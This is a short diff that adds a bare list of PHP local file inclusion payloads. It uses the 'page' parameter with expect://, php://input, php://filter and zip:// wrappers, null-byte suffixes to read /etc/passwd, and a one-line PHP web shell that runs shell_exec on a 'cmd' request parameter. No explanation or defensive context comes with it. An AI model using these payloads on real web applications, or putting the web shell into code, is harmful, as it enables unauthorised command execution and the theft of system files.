@@ -1,0 +1,14 @@
+?page=expect://ls  
+?page=php://input&cmd=ls
+?page=php://filter/resource=/etc/passwd
+?page=php://filter/convert.base64-encode/resource=/etc/passwd 
+?page=zip://path/to/file.zip%23shell 
+
+POST page?php://input&cmd=ls HTTP/1.1
+...
+...
+<?php echo shell_exec($_GET['cmd']);?>
+
+
+/etc/passwd%00
+/etc/passwd%2500
